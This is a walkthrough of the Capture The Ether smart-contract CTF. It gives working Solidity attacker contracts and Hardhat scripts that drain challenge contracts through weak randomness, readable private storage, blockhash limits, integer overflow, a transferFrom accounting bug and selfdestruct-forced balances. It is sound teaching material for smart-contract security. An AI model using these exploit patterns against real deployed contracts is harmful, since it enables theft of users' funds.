# capture-the-ether-solutions
Walkthrough every level of the Capture The Ether CTF


# Note About the Walkthrough

## Usage of Interfaces
Whenever any other external contracts are called, an interface with the called functions is created as a helper in order to make things easier and avoid having to create an encoded payload with each function selector followed by the usage of `_to.call{value: _val}(payload)`. 

An example for an interface would be:

    interface IPredictTheBlockHashChallenge {
        function lockInGuess(bytes32 hash) external payable;
        function settle() external;
        function isComplete() external view returns (bool);
    }

The interface generally is initialized while constructing the attacker contracts when they are used to solve a level.

## Timeout Error
Some scripts may take some time to run because they are deploying contracts and performing several interactions that may have a timeout time greater than the default one of hardhat. If any errors are triggered because of that the following line can be added into the `hardhat.config` file:

    mocha: {
        timeout: 100000000
    }

Enjoy!

# Solutions


## Warmup

### Deploy a contract

This level just teaches how to create an instance. Click deploy and you're ready to go.


### Call Me

Just copy and paste the level code within a Remix session and copy the instance address. Call `callme()` and submit the instance.


### Choose a Nickname

The only trick of this level is the casting from string to bytes32. If you use a hashing function such as `keccak256(bytes(stringValue))` it won't work as intended. Just run a script that handles the conversion from string to a hex value and that's it.

    describe("Setting Nickname", function () {
        it("Should Set the nickname", async function () {
            const myName = "ElPityMartinez"
            const instance = await ethers.getContractAt(
                "NicknameChallenge",
                "0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee"
            );
            const [owner] = await ethers.getSigners();
            
            const newName = ethers.utils.formatBytes32String(myName);
            await instance.connect(owner).setNickname(newName);
        });
    });


## Lotteries

### Guess The Number

This level is quite straight forward. Just call `guess(42)`. Please make sure that you hold at least a balance of `2 rETH + dust`.

    describe("Guessing", function () {
        it("Should Guess the number", async function () {
            const instanceAddr = "0x89E0aE27eA9874aDD6ff5923B520D88C41f6B80e";
            const instance = await ethers.getContractAt("GuessTheNumber", instanceAddr);
            const [owner] = await ethers.getSigners();
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            await instance.connect(owner).guess(42, {value: ethers.utils.parseEther("1")});
            
            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("0"));

        });
    });

### Guess The Secret Number

To solve this it is important to know how a hashing function works. It spans the input data into a scrambled and encoded-like bytes32 chain. The input data should be a bytes data but the key is that those bytes could be number concatenated with strings with different size. So, the return data size will always have 32 bytes, independently from the real input size. Also, the `keccak256` is a asymmetric hashing function. Which means that it works in one way. Knowing the return (image of the function), does not give information about the input. But the most important thing in here is that the hash will always be the same as long as the input parameters are constant.

Taking this into account, and knowing that the maximum value of a `uint8` number is `255`. This can be easily get by doing `type(uint8).max`, `uint8(-1)` in older solidity versions or even `unchecked{ uint8(-1); }` as for `>0.8.0` compiler versions.

Also, we see that the answer is validated only hashing a single input parameter (the guessed number). Which makes it pretty vulnerable. The hash can be bruteforced by creating a script that loops from 0 to 255, and checking if the hash of that number is the same as the `answerHash`. A note on this, if the hashing function used also other parameter, for example `keccak256(abi.encodePacked(n,y))`, the difficulty would increase exponentially but still it is possible to bruteforce the hash. So, it is strongly recommended not to use a hash or even a private variable as a source of "secrecy" or randomness.

By running this script the level is easily cracked:

    describe("Guessing", function () {
        it("Should Guess the secret number", async function () {
            const instanceAddr = "0xAaf26E43dd44cCBeD005c23B4d483bCa95448f5B";
            const nearlySecretHash = "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";

            const instance = await ethers.getContractAt("IGuessTheSecretNumberChallenge", instanceAddr);
            const [owner] = await ethers.getSigners();
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            const maxUint8 = 255;
            for (let index = 0; index <= maxUint8; index++) {
                if(ethers.utils.keccak256(index) == nearlySecretHash){
                    console.log(`The secret number was ${index}`);
                    await instance.connect(owner).guess(index, {value: ethers.utils.parseEther("1")});
                }  
            }

            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.BigNumber.from("0"))

        });
    });



### Guess The Random Number

This level does not require you to calculate a single hash or even try to determine the `blockhash` of the deployment and `now`. It is important to know that the fact that a variable is not public means that the compiler won't translate that as a public view function in order to provide a getter for that (this is what does the compiler when a public variable is declared, it treats it as a public view function). But under no circumstances it means that the value of that variable is not _readable_ . Contracts have the storage layout registered within the blockchain. In other words, data of contracts is stored on chain and the slots where the information is held can be easily consulted if the right slot is spotted.

Each slot has a size of 32 bytes. So, every 32 bytes of information the EVM will add a slot to the stack in order to save information. If the variables that are declared have less than 32 bytes, they can be concatenated and stored in a single slot in order to save space. For example:

    uint256 one;   // this will use the slot 0.
    uint128 two_a; // this will start using slot 1.
    uint128 two_b; // concatenated with two_a on slot 1.

As a conclusion, the information held on each slot can be consulted easily if we know which slot we need to target. This level is solved by targeting the slot 0, because the `answer` variable is the only variable declared there. Using the `getStorageAt` function from ethers, we can get the value as a hex stored at the slot 0.

    describe("Guessing", function () {
        it("Should Guess the random number", async function () {
            const instanceAddr = "0x0C68e4Ef0aD5fb5410A1b0E6241C4a116370Ec35";

            const instance = await ethers.getContractAt("IGuessTheRandomNumberChallenge", instanceAddr);
            const [owner] = await ethers.getSigners();
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            const answer = parseInt(await ethers.provider.getStorageAt(instanceAddr, 0));

            console.log(`The answer is: ${answer}`);
           
            await instance.connect(owner).guess(answer, {value: ethers.utils.parseEther("1")});

            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("0"))

        });
    });

### Guess The New Number

The challenge in here is identifying that the pseudo-random number is generated every time the function is called according to the current parameters of the chain. Because of this, those values can be either manipulated by miners or precalculated by any user if the call is executed in a single step as it is shown. Because we are going to need the current blockchain parameters in order to solve this, the following contract is used to crack this level:

    pragma solidity ^0.8.13;

    contract GuessTheNewNumberAttacker{
        function attack(address _destination) external payable{
            require(address(this).balance >= 1 ether);

            uint8 calculatedAnswer = uint8(
                uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
                ));

            IGuessTheNewNumberChallenge(_destination).guess{value: 1 ether}(calculatedAnswer);

            require(IGuessTheNewNumberChallenge(_destination).isComplete(), "!completed");
            // Transfer back all the funds to the user
            (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
            require(withdrawn,  "!withdrawn");
        }

        receive() external payable {}
    }  

A reminder, do not forget implementing the `receive` fallback. Otherwise, the call will fail because when the instance sends `2 ether` to the winner on this case it will try sending them to `GuessTheNewNumberAttacker`. If the contract lacks from receive or a payable fallback, it cannot receive assets from regular transfers.

### Predict The Future

This level forces you to first lock the answer and then submit it. The core of this level is that the modulo 10 operation will take only the last digit of the `uint8` number from 0 to 9. So there are only 9 possibilities. If you lock the answer (lets say an arbitrary value of 5) and spam with simulated transactions offchain (e.g. using Ethers), you can let pass the transaction that will be successfully mined and that's it. Remember last level solution, regarding how it will be changing dynamically the answer of the lottery according to the current blockchain block values.

A contract that attacks this could be:

    contract PredictTheFutureAttacker {
        IPredictTheFutureChallenge levelInstance;

        constructor(address _levelInstance) {
            levelInstance = IPredictTheFutureChallenge(_levelInstance);
        }

        function lockGuess(uint8 _number) external payable {
            levelInstance.lockInGuess{value: 1 ether}(_number);
        }

        function attack() external {
            levelInstance.settle();

            require(levelInstance.isComplete(), "!completed");

            // Transfer back all the funds to the user
            (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
            require(withdrawn,  "!withdrawn");
        }

        receive() external payable {}
    }

### Predict The BlockHash

Calculating the blockhash of a blockchain is performed essentially by calculating the hash of relevant concatenated parameters of that block (e.g. previous block hash, gas consumption, gas limit, block number, difficulty, root hash, among others). That data is known once the batch of transactions that are going to be included on that block is already defined and the block is generated when a validator/miner validates that block along with the information that is going to be part of that block. 

With all that being said, it is extremely difficult and also very unlikely that a blockhash can be predestinated before its existence (something that it is indeed  possible with smart contract addresses which are generated in a deterministically way which allows predestination!). 

In order to solve this, it is important to understand the limitations of the `blockhash` function. According to [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/units-and-global-variables.html#block-and-transaction-properties): 

> It is the hash of the given block. When blocknumber is one of the 256 most recent blocks; otherwise returns zero.

This means that if the given block is 257 blocks older (or more), the return value will be `bytes32(0)`. So, we get your thinking... yes. We have to wait!!

We can lock the guess as `bytes32(0)`, wait at least 256 blocks to be mined and then call `settle()` and the calculation of the answer will always be `bytes32(0)` starting from that block! Having about 5 blocks mined per minute, it will take about 51.2 mins for that to happen. So, grab a snack or just continue with the rest of the levels!

    pragma solidity ^0.8.13;

    contract PredictTheBlockHashAttacker {
        IPredictTheBlockHashChallenge levelInstance;
        
        // It will be also implicitly initialized as zero if no value is assigned.
        bytes32 public emptyBytes32 = bytes32(0); 

        uint256 lockingBlockNumber;
        uint16 public constant MAX_SAVESPAN = 256;

        constructor(address _levelInstance) {
            levelInstance = IPredictTheBlockHashChallenge(_levelInstance);
        }

        function lockGuess() external payable {
            levelInstance.lockInGuess{value: 1 ether}(emptyBytes32);
            lockingBlockNumber = block.number;
        }

        function remainingBlocks() external view returns(uint256){
            return MAX_SAVESPAN - (block.number - lockingBlockNumber);
        }

        function attack() external {
            require(block.number >= lockingBlockNumber + MAX_SAVESPAN, "Wait until 256 block passed");
            levelInstance.settle();

            require(levelInstance.isComplete(), "!completed");

            // Transfer back all the funds to the user
            (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
            require(withdrawn,  "!withdrawn");
        }
        receive() external payable {}
    }


## Lotteries

### Token Sale

This level requires identifying if it can be cracked by overflowing or underflowing (for more information about underflows and overflows check the first paragraph of the next level solution). Indeed if we get that `1 ether == 1 * 10**18`, we will realize that the `uint256` that tracks down the amount of ether is expressed in `wei`. We just need to overflow this check `numTokens * PRICE_PER_TOKEN` by passing a considerable big amount of `numTokens`, but it should also be controlled (passing a huge amount of tokens will also require to send more value which can be not desired). 

A simple contract is created just as a helper to get those values:

    pragma solidity ^0.4.21;

    contract TokenSaleChallengeAttacker {
        uint256 constant PRICE_PER_TOKEN = 1 ether;

        uint256 public MaxUint256 = uint256(-1);

        // Helper Functions
        function getMaxAmountBeforeOverflow() external pure returns(uint256){
            return (uint256(-1) / PRICE_PER_TOKEN);
        }

        function valueRequired(uint256 _amount) external pure returns(uint256){
            return (_amount * PRICE_PER_TOKEN);
        }
    }

The `getMaxAmountBeforeOverflow()` essentially calculates the maximum amount of tokens that we can buy before overflowing that multiplication. If we buy `getMaxAmountBeforeOverflow() + 1` tokens, that check will overflow and we will be able to send around `0.41 ETH` for the purchase of `getMaxAmountBeforeOverflow() + 1` tokens (which is a bargain). Because the `buy()` function also requires sending the exact value (instead of a more than value), this can also be calculated by passing `getMaxAmountBeforeOverflow() + 1` as an input parameter of `valueRequired()`.

The we can simply call `sell(1)` and the level instance will have remaining around `0.41 ETH` and the win condition will be met. Lucky us that we are using test ether...

### Token Whale

There are several issues regarding this contract. The first one which is the most spottable is that the version of the compiler does not come with built-in overflow/underflow checks such as `^0.8.0`, as a result of this any unsigned number when it reaches the max and adds one or the min and subtracts one, it will overflow or underflow. 

For example:

    uint16(-1) = type(uint16).max     // Underflowing
    uint16(type(uint16).max + 1) = 0  // Overflowing

The second issue which is the key is that how transfers are being performed. ERC20 compliant contracts usually use a general implementation of the internal function `_tranfer(from, to, value)`, where depending which external method is called the `from` parameter is passed as `msg.sender` (in case of regular `transfer()`) or directly as the `from` (for `transferFrom()`). 

The third issue is that there are dummy and residual variable declarations that are not even taken into account. For example, the decimals are apparently not respected because the level assigns 1000 tokens to the user (which in an 18 decimal token it is essentially dust) and also the `totalSupply` only has informative value and it is not used for example to control the minting rate of those tokens.  

With that being said, looking to the code of this level we see that `_transfer()` automatically sets the `from` as the `msg.sender` and also gives the chance to perform a `transferFrom()`. So, a user could create two accounts (Alpha, Beta), Alpha with balance and Beta empty. Alpha can approve Beta for one token and then Beta can call `transferFrom(Alpha, Anyone, 1)`. Because the checks within that function only target the `from` user, and Beta has the allowance `_transfer(Alpha, 1)` will be called. Then, the internal function will decrease Beta's balance in 1 because Beta is indeed the `msg.sender` (which will give Beta a balance of `uint256(-1) = type(uint256).max`) and then Beta can call again `transfer(Alpha, Anything)`. 

This process can be done manually or by using a simple script.

    describe("TokenWhaleChallenge", function () {
        describe("Becoming a Whale", function () {
            it("Exploiting...", async function () {
                const [owner, alice] = await ethers.getSigners();
                const instanceAddr = "0x8ce6A92F2F73049764d01Cf91d78438b1bFa54B5";
            
                const instance = await ethers.getContractAt("ITokenWhaleChallenge", instanceAddr);
                
                const tx1 = await instance.connect(owner).approve(alice.address, 1);
                await tx1.wait;
                const tx2 = await instance.connect(alice).transferFrom(owner.address, ethers.constants.AddressZero, 1);
                await tx2.wait;
                const tx3 = await instance.connect(alice).transfer(owner.address, 2000000);
                await tx3.wait;

            });
        });
    });


### Retirement fund

The main vulnerability of this level is within the `collectPenalty()` function while calculating the `withdrawn` amount. This calculation can be easily manipulated because the balance of a contract can be increased by three ways. Essentially, increasing the balance of the contract will make that `address(this).balance > startBalance` and it will underflow the `uint256` giving an extremely high value of `withdrawn` thus passing the following require and then performing the transfer.

The first one is by sending a regular transfer to the contract. This is only possible if the contract implements a payable fallback function (such as a `fallback payable` itself or `receive payable`). Because the contract does not implement those functions, this way is discarded.

Useful link and quote for the following ways: [SWC-132] 

The second one is by precalculating the address of the level contract and send 1 wei to that address. To do so, it is only needed to know the address of the deployer and the current nonce of that address. This Python script precalculates the address by knowing both the deployers' address and nonce (values that can be get by surfing etherscan for example):

    import rlp
    from eth_utils import keccak, to_checksum_address, to_bytes

    def mk_contract_address(sender: str, nonce: int) -> str:
        sender_bytes = to_bytes(hexstr=sender)
        raw = rlp.encode([sender_bytes, nonce])
        h = keccak(raw)
        address_bytes = h[12:]
        return to_checksum_address(address_bytes)


    sender = "0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea"
    nonce = 4192

    print(mk_contract_address(sender, nonce))

This is how addresses are deterministically calculated. The printed value is indeed the precalculated address. Simply send a regular transfer of 1 before deploying the instance to slightly increase the contract balance.

The third one is by selfdestructing a contract that has 1 wei towards the level. This will forcedly push the balance of the selfdestructed contract into the destination, generating the required imbalance that causes the underflow.

The following contract performs this in one step:

    pragma solidity ^0.8.13;

    contract RetirementFundAttacker{
        constructor(address _retirement) payable {
            require(msg.value >= 1 wei);
            _generateBalance(_retirement);
        }

        function _generateBalance(address _towards) internal {
            selfdestruct(payable(_towards));
        }
    }


Once the balance of the instance is slightly increased, it is needed to call `collectPenalty()` and that's it!